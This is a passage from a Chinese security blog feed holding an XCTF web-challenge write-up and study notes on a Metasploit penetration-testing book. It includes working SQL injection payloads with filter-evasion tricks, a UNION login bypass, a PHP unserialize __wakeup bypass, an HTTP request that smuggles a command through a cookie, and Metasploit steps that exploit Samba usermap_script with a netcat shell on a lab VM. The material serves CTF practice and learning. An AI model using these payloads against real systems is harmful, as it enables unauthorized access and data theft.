'1.jpg&quot;</code></p><p>获取表的长度</p><p><code>filename=&quot;1' &amp; (ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 0,1) ,1,1)) &gt; 100 )&amp; '1.jpg&quot;</code></p><p>获取表的名称</p><p>的确是一个可行的方案，但是这个原题目应该有验证码的，所以盲注需要时间太长了。<br>再看大佬的大佬的注入方法：</p><p><code>‘+concat((selselectect version()))+’.jpg</code></p><p>查看mysql 版本，返回 5.6</p><p><code>‘+concat((selselectect length(database())))+’.jpg </code></p><p>查看database长度 返回 10</p><p><code>‘+concat((selselectect ascii(substr(database(),1,1))))+’.jpg</code></p><p>查看Database名字 返回 119 以此繼續爆..</p><p><code>‘+concat((selselectect ascii(substr((selselectect table_name frfromom  information_schema.tables where table_schema=database() limit  0,1),1,1))))+’.jpg</code></p><p>爆第一个表名 返回 102 以此繼續爆..到第5位</p><p><code>‘+concat((selselectect ascii(substr((selselectect table_name frfromom  information_schema.tables where table_schema=database() limit  1,1),1,1))))+’.jpg</code></p><p>爆第二个表名 返回 104 以此繼續爆..到第18位</p><p><code>‘+concat((selselectect ascii(substr((selselectect column_name frfromom information_schema.columns where table_name=’hello_flag_is_here’ limit 0,1),1,1))))+’.jpg</code></p><p>爆列名字 返回 105</p><p>以此繼續爆..到第10位</p><p><code>‘+concat((selselectect ascii(substr((selselectect i_am_flag frfromom  hello_flag_is_here LIMIT 0,1),1,1))))+’.jpg </code></p><p>爆数据 返回 33 以此繼續爆..到第16位</p><p>跟着这个大佬的思路，总算是做出来了。。。要改一个地方，这个题目过滤了ascii，所以我用了hex来转成16进制输出.</p><p>再遇坑点：hex输出时候会吞掉字符只输出数字。</p><p>这里感觉对concat的理解还不到位。</p><p>再次换方法：放弃concat 使用 conv 对hex 转换成二进制。</p><p>一位一位的读出来。得到flag</p><blockquote><p>好好练习sql注入</p></blockquote><p><b>08-biscuiti-300</b></p><p>打开发现一个简单的username 和password的登录窗</p><p>一个post方法的登录。</p><p>尝试注入,但是不管结果是啥返回只有一个error...</p><p>扔去暴力破解吧...</p><p>ok直接炸出来0的时候admin登陆成功...然并卵啊。</p><p>行吧，那就继续研究注入吧。</p><p>又是没见过的注入：</p><p><code>'union select '123','456'--&amp;password=0 </code><br>可以用任意用注入。</p><p>查看cookie 发现一个base64加密的序列化。</p><p>需要将is admin置为1。</p><p>这里提到了CBC字节反转攻击...padding oracle</p><p><b>09-unserialize3</b><br>题目是一段php，给了一个class，要求用code传输反序列化的字符串。<br>构造了一个反序列化提交：O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，返回bad request。<br>这里由于class内有__wakeup()函数导致在反序列化时会运行这个函数。<br>于是题目转变成了魔术函数的绕过：这是一个CVE，漏洞编号CVE-2016-7124<br>当成员属性数目大于实际数目时可绕过__wakeup()。<br>修改poc,得到flag。<br><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p><b>10-wtf.sh-150</b></p><p>连接是一个带有注册和登录的论坛界面。<br>一开始以为是注入...对着测试了一通。。<br>还是跟着大佬的脚步把、、、<br>不得不说大佬是真的强：对于注册窗口用户名存xss漏洞都能挖出来...<br>首先这题存在着源码泄露：wtf.sh可以直接查看源码<br>查看源码时可以发现存在LFI漏洞，我们需要以管理员身份登陆，并且登录的token 和password在/users目录下<br>尝试使用LFI漏洞进行访问：../users<br>得到了众多用户的md5 密文和base64的token<br>修改cookie和token F5刷新可以看到，我们已经是管理员登录了，在管理page页面内得到了...半句flag(wtf??)<br>行吧，这种题目水平已经不是我能够做的了，老实的跟着大佬做吧...<br>继续查看源码...会发现在reply中包含一个可以写入文件的参数、<br>首先注册用户名为 ${find,/,-iname,get_flag2} 的用户，并以该用户进行提交<br><code>POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1 Host: web.chal.csaw.io:8001 Content-Type: application/x-www-form-urlencoded Cookie: USERNAME=$&#123;find,/,-iname,get_flag2&#125;; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ== text=asd&amp;submit=</code><br>之后访问我们提交的页面/users_lookup/sh.wtf<br>可以得到flag2的访问路径。<br>由此，我们重新构造请求访问Flag2即可。</p><p><b>11-Training-WWW-Robots</b></p><p>题目提示 robots.txt，是一个 robots 泄露。访问提示：/fl0g.php，访问得到flag<br>。。。题目难度差距有点大。</p><p><b>12-PHP2</b></p><p>有个坑点。。。原题好像有提示说index.phps有源码...<br>打开查看源码,发现是一个二次url加密绕过...对admin二次加密即可...</p><p><b>13-lottery</b></p><p>这个源码给的就很舒服了，直接就在附件中，先看源码吧。</p><p><b>14-FlatScience</b></p><p>robots.txt给了两个页面的提示，访问login.php存在注释：debug参数<br>GET debug参数可以查看源码，发现存在注入点。<br>注入得到cookie提示，密码在他的论文里。<br>写个脚本跑sha1值得到密码。<br>登录即可。</p><p>注入payload:usr=' union select 1,(select id || '; ' || name || '; ' || password || '; ' || hint from Users limit 1)--&amp;pw=</p><p><b>15-ics-01</b></p><p>题目提示是一个工控系统，寻找入手点。<br>自己做的时候绕了一大阵子那个上传点，一中午之后愤怒查找题解。。。</p><p>结果还是少了几句话的提示原因。。。</p><p>首先源码泄露....不知道为什么御剑字典里没有这种类型的测试。</p><p><code>.index.php.swp</code><br><code>.index.php.swo</code><br><code>.index.php.swn</code></p><p>下载到源码swp文件，但是就是怎么都恢复不出来???<br>行吧，默认当作有源码做了。。。<br>然后发现可以使用php://input来查看upload.php的源码...</p><p><b>16-NaNNaNNaNNaN-Batman</b></p><p>好的我又开始上提还没做完就来做下一道题了。<br>这题只有一个附件，给了一个web100的源码。<br>里面大概是js代码的样子。<br>熟悉的特殊符号。。。这题好像哪里见到过的样子。但是想不起来怎么处理的了。<br>估计又是做了一半扔掉了。</p><p>OK，老规矩之后，这题学习一下chrome调试大法。<br>F12 -&gt; source 进入到开发者模式。在eval前加入断点调试。即可得到源码。。<br>正则表达式构造出密码直接得到flag.</p><p>还有好多种骚方法。。。直接代码审计，，，看出flag。<br>还有大佬把eval()换成alert()....直接弹出来。<br>dalao tql...</p><p><b>17</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.字典 : <a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;XCTF&lt;/h1&gt;
&lt;h3 id=&quot;b-0x00-前言-b&quot;&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;找到这个地方也是几经周折...发现自己错过了Hgame...然后不甘心的一顿搜索，结果撞到这个地方。&lt;br&gt;
不说了，刷起。&lt;/p&gt;
&lt;h3 id=&quot;b-0x</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit渗透测试魔鬼训练营笔记</title>
    <link href="http://blog.dvkunion.cn/2019/01/30/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.dvkunion.cn/2019/01/30/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</id>
    <published>2019-01-30T22:30:00.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>Metasploit渗透测试魔鬼训练营渗透笔记</h1><p><i>2019-1-30</i></p><p><a href="https://github.com/Urinx/Books/raw/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5.pdf">Metasploit渗透测试魔鬼训练营渗透.pdf</a></p><!-- split --><p>日常写点什么<br>寒假开始一周多，想把这本搞了快半年的书彻底的读完。<br>写一个小总结似的笔记，把书里的课后习题和镜像练习实验都一遍。<br>也附带的写一下遇到的坑点和心得吧。<br>调整了一下结构，把每一章的小结都放到了开始部分，希望以后复习时候可以一口气回答出这些问题。</p><span id="more"></span><p><i>2019-2-13</i></p><p>读到中间部分感觉这本书还是有点年代感了，有些工具已经不再支持甚至不能够使用了，然而强迫症又想把所有的都做完...很难受。<br>后面部分可能会过的快一点...</p><hr><h2 id="b-第一章-b"><b>第一章</b></h2><p>在这一章主要是介绍 Metasploit 以及渗透测试的基本流程和名词定义。</p><p><b>第一章小结：</b></p><blockquote><p>1.什么是渗透测试?<br>2.渗透测试标准?<br>3.渗透测试流程?<br>4.渗透测试核心?<br>5.Metasploit是什么?<br>6.Metasploit发展史?<br>7.Metasploit主要6模块?<br>8.Metasploit安装和启动?</p></blockquote><p><b>什么是渗透测试?</b><br><b>渗透测试(Penetration Testing)</b>是一种模拟恶意攻击者的技术方法，对安全系统进行测试攻击，取得访问控制权，并发现安全隐患的一种安全测试与评估方法。这些渗透测试者一般称为渗透工程师。</p><p>渗透测试一般分为两种，即<b>黑盒测试</b>和<b>白盒测试</b><br>黑盒测试：设计一个对客户一无所知的渗透攻击<br>白盒测试：拥有客户组织所有知识情况下的渗透测试<br>灰盒测试：将以上两种测试方法结合的渗透测试</p><p><b>安全业界的开源测试手段：</b></p><table><thead><tr><th>名称</th><th>简写</th><th>简述</th></tr></thead><tbody><tr><td>安全测试方法开源手册</td><td>OSSTMM</td><td>提供物理安全、人类心理学、数据网络、无线通信、电讯通信五类渠道的测试用例</td></tr><tr><td>网络安全测试指南</td><td>NIST SP 800-42</td><td>美国国家标准与研究院(NIST)所讨论</td></tr><tr><td>十大web应用安全项目</td><td>OWASP TOP 10</td><td>针对高风险的web领域</td></tr><tr><td>渗透测试执行标准</td><td>PTES</td><td>广泛应用的一个执行标准：<a href="http://www.pentest-standard.org">PTES</a></td></tr></tbody></table><p><b>渗透测试过程环节：</b></p><table><thead><tr><th>id</th><th>阶段名称</th><th>英文名称</th><th>执行动作</th></tr></thead><tbody><tr><td>1</td><td>前期交互阶段</td><td>Pre-engagement Interactions</td><td>定制渗透测试的范围、目标、限制条件、服务合扩谱图同等</td></tr><tr><td>2</td><td>情报搜集阶段</td><td>Intelligence Gathering</td><td>通过信息搜集获取更大关于目标组织网络拓扑、系统配置等信息</td></tr><tr><td>3</td><td>威胁建模阶段</td><td>Threat Modeling</td><td>通过信息搜集的信息进行讨论分析最可行的攻击手段</td></tr><tr><td>4</td><td>漏洞分析阶段</td><td>Vulnerability Analysis</td><td>寻找漏洞攻击点，进行漏洞的挖掘</td></tr><tr><td>5</td><td>渗透攻击阶段</td><td>Exploitation</td><td>实施渗透攻击获取目标控制权</td></tr><tr><td>6</td><td>后渗透攻击阶段</td><td>Post Exploitation</td><td>总结攻击途径</td></tr><tr><td>7</td><td>报告阶段</td><td>Reporting</td><td>撰写报告，将完整的渗透过程进行总结，并提出补救方案</td></tr></tbody></table><blockquote><p>渗透阶段一般包含7个阶段，由主要核心的5部渗透和开头的服务交互再加上最后的报告。</p></blockquote><p><b>安全漏洞生命周期：</b></p><blockquote><p>A BUG's Life</p></blockquote><p>渗透测试的目的：找出系统中存在的安全漏洞，并实施渗透攻击。<br>安全系统漏洞(Vulnerability)：指信息系统中存在的缺陷或不适当的配置。<br>渗透代码(Exploit)：利用安全漏洞来造成入侵或是破坏效果的程序。<br>安全漏洞的生命周期：<br>1&gt; 安全漏洞研究与挖掘:包括代码审计，逆向工程，Fuzz测试。<br>2&gt; 渗透代码开发与测试:开发验证概念性的代码(POC)，来进行漏洞的验证<br>3&gt; 安全漏洞和渗透代码在封闭团队中流传<br>4&gt; 安全漏洞和渗透代码开始扩散<br>5&gt; 恶意程序出现并传播<br>6&gt; 渗透代码/恶意程序大规模传播并危害互联网<br>7&gt; 渗透攻击代码/攻击工具/恶意程序消亡</p><p>在上述2-5的流程中出现的漏洞一般被称为“0day”<br>恶意程序传播后称作“1day”</p><blockquote><p>要记得什么是0day等...不然根本同不懂大佬门在说什么</p></blockquote><p><b>漏洞披露方式：</b><br>1&gt; 完全公开披露<br>2&gt; 负责人的公开披露<br>3&gt; 进入底下经济产业链<br>4&gt; 小范围利用直至被动披露</p><p><b>漏洞资源库：</b></p><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>cnnvd</td><td><a href="http://www.cnnvd.org.cn">www.cnnvd.org.cn</a></td></tr><tr><td>乌云漏洞库</td><td><a href="http://www.wooyun.org">www.wooyun.org</a></td></tr><tr><td>metasploit</td><td><a href="http://www.metasploit.com/modules">www.metasploit.com/modules</a></td></tr><tr><td>Exploit-db</td><td><a href="http://www.exploit-db.com">www.exploit-db.com</a></td></tr><tr><td>PacketStorm</td><td><a href="http://packetstormsecurity.org">packetstormsecurity.org</a></td></tr><tr><td>SecurityFocus</td><td><a href="http://www.securityfocus.com/bi">www.securityfocus.com/bi</a></td></tr><tr><td>SecurityReason</td><td><a href="http://securityreson.com/exploit_alert/">securityreson.com/exploit_alert/</a></td></tr><tr><td>SecurityVulns</td><td><a href="http://securityvylns.com/exploits/">securityvylns.com/exploits/</a></td></tr><tr><td>1337days</td><td><a href="http://1337day.com">1337day.com</a></td></tr></tbody></table><p><b>Metasploit 历史简介：</b></p><p>初级阶段：HD Moore 在 2003 年成立<br>2003年10月，发布了第一个基于Perl的Metaslpoit版本V1.0，仅有11个渗透攻击模块。<br>2004年4月，发布了MetaslpoitV2.0，此时已经包含18个渗透攻击模块和27个攻击载荷模块。<br>2004年8月，在BlackHat大会上发布了MetaslpoitV2.2，进入了飞速发展的时代。<br>2007年5月，进行了长达18个月的代码移植，发布了MetaslpoitV3.0版本，支持177个渗透模块，104个攻击模块以及30个辅助模块。<br>2009年，MetaslpoitV3.3已经发展到796个模块，41.9万行代码。<br>2009年，Metaslpoit被Rapid7收购，之后推出express以及pro版本。<br>2011年8月,MetaslpoitV4.0发布，引入了后渗透模块。</p><p><b>Metasploit框架：</b><br>Metasploit主要由五部分组成。</p><p>1&gt; 基础文件库:位于源码根目录下libraries目录下，有三个部分：rex、framework-core、framework-base。<br>rex：框架的基础组件，如：网络包装套接字、日志系统、PostgreSQL支持等<br>framework-core：负责与上层的模块插件的交互接口<br>framework-base：扩展framework-core，用于调用自身模块和集成模块</p><blockquote><p>我做测试时候使用的是kali自带的metasploit，并没有发现这三个部分的文件，其主目录位于/usr/share/metasploit-frame下。</p></blockquote><p>2&gt; 模块：由Metasploit框架所搭载实行渗透测试功能的部分。主要有6个部分：辅助模块Aux、攻击模块Exploits、后渗透攻击模块Post、攻击载荷模块Payloads、空指令模块Nops、编码器模块Encoders。</p><blockquote><p>模块部分是Metasploit的核心，这六部分模块不在这里做介绍，在后面每部分的使用的时候进行详细的表述。</p></blockquote><p>3&gt; 插件：Metasploit支持外部插件来扩展功能，如Nessus、OpenVas漏洞扫描器插件。<br>4&gt; 接口：Metasploit提供多种外部用户接口，如控制台：msfconsole、命令行：msfcli、图形化界面：msfgui等。</p><blockquote><p>做本章作业的时候发现，msfcli不能使用。bash不存在这个命令。查了一下结果发现msfcli早就已经废弃了...用msfconsole取代。有点坑...<br><a href="https://blog.rapid7.com/2015/07/10/msfcli-is-no-longer-available-in-metasploit/">原文链接</a></p></blockquote><p>5&gt; 功能程序：除了上述的四部分，Metasploit还提供一系列可执行程序，可以封装攻击荷载、多种类型的解码等。</p><p><b>第一章作业</b><br>1&gt; <font color = "Brown">通过搜索引擎、安全信息漏洞库搜索Samba服务usermap_script安全漏洞的相关信息。绘出生命周期图，标注重要时间点。</font></p><blockquote><p>度娘一下，这个漏洞应该是一个非常老旧的漏洞了...我jio着。<br>结果，哇，全是大佬们整理好的...orz...<br>揣摩一遍，还是进到CNNVD来自己看一遍吧...不然这个作业抄上了一点意义都没有了...</p></blockquote><blockquote><p>漏洞名称：Samba用户名映射脚本命令执行<br>漏洞编号：CVE-2007-2447(居然是07年的，这么近...啊也不近了，都2019了...)<br>存在版本：Samba 3.0.0 - Samba 3.0.25rc3<br>简单描述：MS-RPC功能允许远程攻击者在启用“用户名映射脚本”smb.conf选项时，通过涉及SamrChangePassword函数的shell元字符执行任意命令，并允许远程认证用户通过shell元字符执行命令<br><a href="/img/k1uVpD.md.png"><img src="/img/k1uVpD.md.png" alt="k1uVpD.md.png"></a></p></blockquote><p>2&gt; <font color = "Brown">更新Metasploit，找出攻击模块具体位置，查看一下针对不同系统的攻击模块数量。</font></p><blockquote><p>我所使用的Metaspoit版本为：metasploit v5.0.1-dev<br>总模块数量：aux：1046；exp:1851；post:321；payloads:541:encoders：44；nops:10<br>渗透攻击模块的位置位于：/usr/share/metasploit-framework/modules/<br>进入到exploits，可以发现几个明显的由操作系统命名的文件夹，Shell统计一下：</p></blockquote><p><code># ls -lR | grep &quot;^d&quot; | wc -l</code></p><blockquote><p>关于windows的攻击模块一共有47个。</p></blockquote><p>3&gt; <font color = "Brown">分别在Win和Linux下安装Metaspoit，运行并获取Linux靶机usermap_script漏洞渗透攻击，尝试植入VNC图形化远程控制工具的攻击荷载，成功获得Linux靶机上的远程控制桌面。</font></p><blockquote><p>我的win下一直都没有装Metasploit...因为...懒癌...<br>就使用kali下的做一下简单的尝试吧。kali-ip:10.10.10.128<br>靶机为Metasploitable2-ip:10.10.10.254<br>虚拟机内的连接为NAT模式。<br>首先进入msfconsole，使用samba_script模块</p></blockquote><blockquote><p><code>msf5 &gt; use multi/samba/usermap_script</code></p></blockquote><blockquote><p>使用show payloads查看攻击载荷，选定bind_netcat</p></blockquote><blockquote><p><code>msf5 exploit(multi/samba/usermap_script) &gt; set payload cmd/unix/bind_netcat</code></p></blockquote><blockquote><p>使用show options 查看需要设置的参数<br>将IP设置为靶机</p></blockquote><blockquote><p><code>msf5 exploit(multi/samba/usermap_script) &gt; set RHOSTS 10.10.10.254</code></p></blockquote><blockquote><p>exploit!</p></blockquote><blockquote><p>可以看到msf反馈已经成功，等待输出bash命令<br><a href="/img/k1KjsJ"><img src="/img/k1KjsJ.md.png" alt="k1KjsJ.md.png"></a></p></blockquote><p>4&gt; <font color = "Brown">使用msfcli命令行接口写一个SHELL脚本，实现用户只需要输入目标Linux靶机IP就可以使用usermap_script漏洞渗透攻击模块获取远程靶机的shell访问。</font></p><blockquote><p>上面说了msfcli已经被弃用，尝试用上文博客的方法写一个脚本<br>shell的写法还不是很熟练...代码只是简单粗暴的实现了所需功能...运行下过如下<br><a href="/img/k1M8yQ"><img src="/img/k1M8yQ.md.png" alt="k1M8yQ.md.png"></a><br>贴上代码<br><a href="/img/k1MGLj.md.png"><img src="/img/k1MGLj.md.png" alt="k1MGLj.md.png"></a></p></blockquote><h2 id="b-第二章-b"><b>第二章</b></h2><p>这一章主要搭建后面实现所需要的的网络拓扑环境</p><p><b>第二章小结：</b></p><blockquote><p>1.虚拟机内NAT和网桥的区别?<br>2.怎么配置IP?</p></blockquote><p>这本书需要的镜像总共为5个，统一安装在vm内。</p><table><thead><tr><th>名称</th><th>类型</th><th>模拟功能</th><th>基础操作系统</th><th>域名</th><th>IP</th></tr></thead><tbody><tr><td>Kali(原书使用BackTrack 5)</td><td>Linux攻击机</td><td>初始攻击点主机</td><td>Ubuntu</td><td><a href="http://attacker.dvssc.com">attacker.dvssc.com</a></td><td>10.10.10.128</td></tr><tr><td>OWASP BWA v0.94</td><td>Web服务靶机</td><td>门户网站服务器</td><td>Ubuntu</td><td><a href="http://www.dvssc.com">www.dvssc.com</a></td><td>10.10.10.129</td></tr><tr><td>Win2K3 Metasploitable</td><td>Windows靶机</td><td>后台服务器</td><td>Win2K3 En</td><td><a href="http://service.dvssc.com">service.dvssc.com</a></td><td>10.10.10.130</td></tr><tr><td>Linux Metasploitable</td><td>Linux 靶机</td><td>网关服务器</td><td>Ubuntu 8.04</td><td><a href="http://gate.dvssc.com">gate.dvssc.com</a></td><td>10.10.10.254(外)/192.168.10.254(内)</td></tr><tr><td>WinXP Metasploitable</td><td>Windows 靶机</td><td>内网客户端主机</td><td>WinXP En</td><td><a href="http://intranet1.dvssc.com">intranet1.dvssc.com</a></td><td>192.168.10.128</td></tr></tbody></table><p>各个镜像的配置和虚拟机的设置书上已经写得非常详细了，设置好VMnet1和VMnet8两张网卡的网段，再修改每一台主机的IP地址、Host模拟:修改靶机Host将域名和IP相对应。最终检测每一台虚拟机的互相连通性即可。</p><p>网关机192.168.10.254要打开路由转发功能net.ipv4.ip_forward,同时防火墙iptables的设置要正确。</p><p><b>第二章作业</b><br>1&gt; <font color = "Brown"> 搭建本章环境，测试连通性</font></p><blockquote><p>这个环境的搭建算是对基础的一个考验，如果网络基础非常好的话修改配置应该会应心得手，很快完成第二章的内容；其次也是对排错能力的一个考验，在实验过程中，由于我的攻击主机使用的kali，在配置网络时候没有注意到CIRD子网掩码二进制的不相同导致网络一直不相同等等问题。<br>总而言之，在这一章主要为后面的实验搭建好良好的环境：工欲善其事，必先利其器。</p></blockquote><p>2&gt; <font color = "Brown"> Vmware虚拟机的构建 </font></p><blockquote><p>这个目前还没有办法做到，等遇到了合适的渗透镜像时候会不断的加进来</p></blockquote><h2 id="b-第三章-b"><b>第三章</b></h2><p>在第三章主要讲了渗透测试的第一个步骤：信息搜集。</p><p><b>第三章小结：</b></p><blockquote><p>1.什么是外围信息收集?<br>2.什么是网络扫描?<br>3.常见的网络扫描有哪些?<br>4.Metasploit有哪些模块适用于信息侦查中?<br>5.Metasploit如何共享信息侦查的数据/成果?</p></blockquote><p>侦查：<br>目标：渗透测试目标的范围，发现渗透目标的安全漏洞与脆弱点，为后续的渗透攻击提供基础。<br>侦查包含：外围信息搜集/公开渠道信息搜集、网络扫描等。</p><h3 id="font-color-LightSkyBlue-3-1-外围信息收集-font-br"><font color = "LightSkyBlue">3.1 外围信息收集</font><br></h3><p><b>通过DNS和IP的侦查挖掘</b></p><p>1&gt; whois域名注册查询<br>msf内置：whois命令<br><a href="http://whois.chinaz.com">站长之家</a><br>2&gt; nslookup/dig 域名查询<br>nslookup:set type=A[MX(Mail Exchange)]<br>ls -d <a href="http://xxxxx.com">xxxxx.com</a><br>dig @&lt;dns服务器&gt; &lt;域名&gt;<br>3&gt; <a href="https://www.maxmind.com">IP2Location地址查询</a><br>4&gt; <a href="http://searchdns.netcraft.com">netcraft信息查询</a><br>http:toolbar.netcraft.com/site_report?url=<a href="http://www.testfire.net">http://www.testfire.net</a><br>5&gt; <a href="http://site.ip138.com/">IP2反查域名</a><br>6&gt; <a href="http://www.7c.com/">站长工具</a></p><blockquote><p>由于这本书出版的年代已经有些久远，所提供的一些工具网址不能够很好地进行运作。能达到同一目的的工具有很多，所以主要是需要了解每一个查询所能获取到哪些有用的信息。<br>whois查询：通过43端口建立tcp连接向服务器进行传送查询请求。这个功能可以查到域名下的DNS服务器、域名备案联系人、联系人邮箱、注册商地址、域名有效时间、注册时间、域名状态等等。同样通过whois反查，可以通过这一个域名所查处的邮箱、联系人、电话等等查到注册该域名的所有者所拥有的其他域名。<br>nslookup&amp;dig：这两个工具在使用的时候没有感觉出多么强大...因为我只看到了对于域名的IP解析...那直接ping一下不就好了么...orz....仔细查了一下，这两个工具更多的适用于dns服务器的查询与测试的...<br>IP2Location：这个就很显而易见了，拿到了域名IP通过IP定位一下服务器所在位置。<br>netcraft：用于子域名查询，在当前的二级域名上可以查询到多少个子域名。<br>IP2Domain：用于查询一台服务器上有多少个虚拟主机，即一个IP上绑定了多少个域名的解析。</p></blockquote><p><b>通过搜索引擎的信息搜集</b></p><p>1&gt; GoogleHacking技术<br>自动化工具：SiteDigger/Search Diggity<br><a href="http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx">SiteDigger</a><br><a href="http://www.stachliu.com">Search Diggity</a></p><blockquote><p>这两个自动化的工具原书的网址全凉了...去搜集一下这两个东西。<br>SiteDigger：安装完了...英文...应该是输入域名然后选择数据库？之后就进行搜索...<br>Search Diggity：原网址变更<a href="http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/">Search Diggity New</a> 。 帮助手册都是英文...瞬间就不想看了。<br>还是放上GHDB吧:<a href="https://www.exploit-db.com/google-hacking-database">GHDB</a></p></blockquote><p>2&gt; 测试网站目录结构<br>google:parent directory site:<br>搜索inc配置文件/bak备份文件/txt或sql数据文件<br>Metasploit:brute_dirs/dir_listing/dir_scanner暴力</p><p><code>use auxiliary/scanner/http/dir_scanner</code><br><code>set THREAD 50</code><br><code>set RHOST xxxxxxxx.com</code><br><code>exploit</code></p><blockquote><p>对于google黑语法我在百度稍微的试了一下，总感觉度娘还是拦截掉了一些东西。没有Google用起来的感觉舒服。<br>对于Metasploit,简单的测试一下：应改和御剑这类工具是一样的，用字典来不断发送请求并对返回的状态码进行统计。只是不知道这个字典和御剑比起来那个更强一点。</p></blockquote><p>3&gt; 检索特定类型文件<br>google:site:xxxx.com file type:xls</p><p>4&gt; 搜索网站中的email地址:</p><p>Metasploit:search_email_collector模块</p><p><code>use auxiliary/gather/search_email_collector</code><br><code>set DOMAIN xxxxxxxx.com</code><br><code>run</code></p><p>5&gt; 搜索sql注入的页面<br>google:site:xxxx.com inurl:login</p><p><a href="http://www.cz88.net/">纯真数据库</a><br>traceroute</p><h3 id="font-color-LightSkyBlue-3-2-主机探测、端口扫描-font-br"><font color = "LightSkyBlue">3.2 主机探测、端口扫描</font><br></h3><p><b>主机探测：</b></p><p>对网段活跃主机的探测:<br>1.ping</p><p>2.Metasploit 模块<br>modules/auaxiliary/scanner/discovery:arp_sweep、ipv6_multicast、ipv6_neighbor、ipv6_neighbor_route_advertisement、udp_probe、udp_sweep<br>arp_sweep:arp确认网段中活跃主机<br>udp_sweep:udp确认网段中活跃主机并发现服务</p><p>3.Nmap<br>metasploit集成了nmap模块,使用方法不再赘述。</p><p><b>端口扫描：</b></p><p>在Metasploit中：serach postscan可以发现端口扫描工具<br>auxiliary/scanner/portscan/sys、ack、ftpbounce、tcp、xmas</p><p><b>服务扫描：</b></p><p>metasploit：_version/_login<br>e.g. ：http_version查找网络中web服务器。</p><p>也存在着例外：mssql_ping 检测 SQL-server服务(1433)</p><p>常见检测：telnet_version、ssh_version、tnslsnr_version(1521，oracle数据库)、open_proxy(开放代理检测)</p><h3 id="font-color-LightSkyBlue-3-3-口令猜测、嗅探-font-br"><font color = "LightSkyBlue">3.3 口令猜测、嗅探</font><br></h3><p><b>常用嗅探模块：</b></p><p>ssh_login、psnuffle</p><p>ssh_login：auxiliary/scanner/ssh/ssh_login</p><p>psnuffle：auxiliary/sniffer/psnuffle</p><h3 id="font-color-LightSkyBlue-3-4-漏洞扫描-font-br"><font color = "LightSkyBlue">3.4 漏洞扫描</font><br></h3><p>自动化扫描器：nessus、OpenVAS<br>针对性扫描器：nmap<br>这一小结的三个工具放到专门的工具博文下详细记录</p><p><b>OpenVAS</b></p><p>1).配置：<br>1&gt;生成运行所需要的证书文件<br><code># openvas-mkcert -q</code><br><code># openvas-mkcert-client -q</code><br>2&gt; 升级NVT库<br><code># openvas-nvt-sync</code><br>3&gt;初始化<br><code># openvassd</code><br><code># openvasmd --migrate</code><br><code># openvasmd --rebuild</code></p><p><b>Nessus</b></p><p><b>nmap</b></p><p>nmap集成了很多的漏洞扫描脚本，在Kali内的目录为：</p><h3 id="font-color-LightSkyBlue-3-5-信息整理与共享-font-br"><font color = "LightSkyBlue">3.5 信息整理与共享</font><br></h3><p>作为这一章结尾，信息整理与共享的确值得这个重量。良好的习惯和方法能够做到事半功倍的效果。</p><p>Metasploit支持使用数据库的形式导出与导入信息搜集的内容。db_nmap可以直接将nmap的扫描结果存储到数据库中；db_import支持数种格式的扫描结果的导入。</p><p>Metasploit数据库功能需要PostgreSQL的支持，Kali已经内置。</p><p>首先需要启动数据库</p><p><code># service postgresql start</code></p><p>第一次使用数据库时候，需要初始化：</p><p><code># msfdb init</code></p><p>在postgresql中会生成msf和msf_test两表</p><p>进入到msfconsole，输入下列命令查看数据库连接状态：</p><p><code>msf -&gt; db_status</code></p><p>如果初始化数据库这一步正常的话，这里可以直接看到数据库已经连接，连接的是默认的本地msf数据库。</p><p>想要连接其他数据库时，可以使用db_connect进行连接，语法为：</p><p>db_connect 用户名:密码@服务器地址:端口 / 数据库名</p><p><code>msf -&gt; db_connect postgres:password@localhost:7337 / msf</code></p><p>同理可知，db_disconnect 断开连接。</p><p>连接到数据库后，可以使用hosts命令查看数据库是否和已正常使用。</p><p><code>msf -&gt;hosts</code></p><p>一切正常后，我们就可以使用 db_nmap 等封装命令直接将扫描结果储存在数据库中。</p><p>同样也可以将nmap扫描输出的文件使用 db_import 进行查看</p><blockquote><p>笔记：db_import 还可以识别 Acunetix、Amap、Appscan、Burp Session、Microsoft Baseline Security Analyzer 、 Nessus 、 NetSparker、NeXpose 、OpenVAS report、Retina等。<br>基本不认识几个。。。等这个结束以后慢慢补上然后进行测试。</p></blockquote><p>小组共享数据有两种方式，一是通过连接同一个数据库，二是使用MSF RPC数据库。<br>第一种方法需要配置 postgresql 的配置，使其允许远程的数据库连接请求。<br>第二种需要小组其中的一台机器使用 mfsrpcd 命令进行创建，其他小组成员通过GUI进行连接。</p><blockquote><p>此处在未来工作后再进行详细补充</p></blockquote><p><b>第三章作业</b><br>1&gt; <font color = "Brown"> 